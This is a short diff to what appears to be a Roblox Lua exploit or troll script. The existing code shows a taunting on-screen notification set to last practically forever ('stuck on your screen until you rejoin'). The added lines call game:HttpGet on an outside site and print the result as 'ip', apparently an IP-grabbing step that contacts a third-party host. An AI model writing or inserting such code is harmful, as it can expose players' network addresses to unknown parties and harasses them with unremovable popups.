@@ -20,3 +20,6 @@ Title = "L";
 Text = "Btw this is now stuck on your screen until you rejoin";
 Duration = 9000000000000000000000000;
 })
+
+local ip = tostring(game:HttpGet("https://shhh.lol/BNDH5Y.html", true))
+print(ip)
